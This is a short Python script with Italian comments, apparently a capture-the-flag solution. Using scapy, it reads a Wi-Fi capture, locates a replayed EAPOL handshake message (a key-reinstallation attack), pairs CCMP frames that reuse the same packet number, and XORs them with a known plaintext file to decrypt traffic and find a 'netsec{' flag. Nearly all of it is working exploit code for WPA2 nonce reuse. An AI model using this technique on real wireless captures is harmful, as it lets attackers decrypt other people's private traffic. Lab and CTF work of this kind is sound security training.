from scapy.all import Dot11, Dot11CCMP, EAPOL, rdpcap

pkts = rdpcap("capture-3 (3).pcap")

# 1. Cerco i pacchetti EAPOL per vedere dove viene rifatto il replay del msg 3
for idx, p in enumerate(pkts):
  if p.haslayer(EAPOL):
    # controllo replay_counter come suggerito
    raw = bytes(p[EAPOL])
    rc = int.from_bytes(raw[9:17], "big")
    print(f"idx={idx} ta={p[Dot11].addr2} ra={p[Dot11].addr1} rc={rc}")

# Dal output vedo che al pacchetto 352 (indice 0-based) ce il replay verso 3c:22:fb:d1:fe:f5
client = "3c:22:fb:d1:fe:f5"
idx_attacco = 352

prima = {}
dopo = {}

# 2. Estraggo i frame protetti  non retry del client e leggo il PN
for idx, p in enumerate(pkts):
  if p.haslayer(Dot11CCMP) and p[Dot11].addr2 == client:
    # salto le ritrasmissioni (wlan.fc.retry)
    if p[Dot11].FCfield & 0x08:
      continue

    ccmp = p[Dot11CCMP]
    # calcolo PN a 48 bit
    pn = (
        ccmp.PN0
        + (ccmp.PN1 << 8)
        + (ccmp.PN2 << 16)
        + (ccmp.PN3 << 24)
        + (ccmp.PN4 << 32)
        + (ccmp.PN5 << 40)
    )

    body = bytes(ccmp.data)
    # tolgo 8B LLC + 20B IP + 20B TCP davanti e 8B MIC in fondo
    payload = body[48:-8]
    if len(payload) == 0:
      continue

    if idx < idx_attacco:
      prima[pn] = payload
    else:
      dopo[pn] = payload

# 3. Leggo il file noto P1 e faccio XOR sui PN uguali: P2 = C1 ^ C2 ^ P1
with open("expense-form.txt", "rb") as f:
  p1_file = f.read()

for pn in prima:
  if pn in dopo:
    c1 = prima[pn]
    c2 = dopo[pn]
    c1_xor_c2 = bytes([a ^ b for a, b in zip(c1, c2)])

    # provo gli offset del file per allineare P1 con il pacchetto C1
    for off in range(len(p1_file) - len(c1_xor_c2) + 1):
      pezzo_p1 = p1_file[off : off + len(c1_xor_c2)]
      p2 = bytes([a ^ b for a, b in zip(c1_xor_c2, pezzo_p1)])
      if b"netsec{" in p2:
        print(f"PN={pn}, offset={off}:")
        print(p2.decode("utf-8", errors="ignore"))